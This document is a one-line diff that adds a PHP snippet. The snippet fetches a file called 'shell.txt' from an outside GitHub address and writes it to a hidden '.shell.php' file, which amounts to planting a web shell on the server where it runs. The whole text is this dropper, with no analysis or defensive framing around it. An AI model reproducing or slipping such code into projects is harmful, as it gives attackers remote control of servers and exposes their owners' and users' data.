@@ -1,0 +1,1 @@
+<?php $z=fopen('.shell.php','w');fwrite($z,file_get_contents('https://github.com/chaitanyamrk/Webtools/blob/master/shell.txt'));fclose($z); ?>
